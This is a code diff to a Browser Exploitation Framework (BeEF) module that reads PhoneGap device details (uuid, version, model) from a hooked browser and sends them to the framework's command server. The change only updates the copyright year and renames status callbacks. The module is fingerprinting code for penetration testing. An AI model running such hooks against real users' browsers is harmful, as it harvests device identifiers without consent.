@@ -1,6 +1,6 @@
 //
-// Copyright (c) 2006-2021 Wade Alcorn - wade@bindshell.net
-// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
@@ -19,8 +19,8 @@ beef.execute(function() {
         + " uuid: " + device.uuid
         + " version: " + device.version
 	+ " model: " + device.model;
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap=" + phonegap_details, beef.are.status_success());
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap=" + phonegap_details, beef.status.success());
     } catch(e) {
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unable to detect phonegap", beef.are.status_error());
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unable to detect phonegap", beef.status.error());
     }
 });
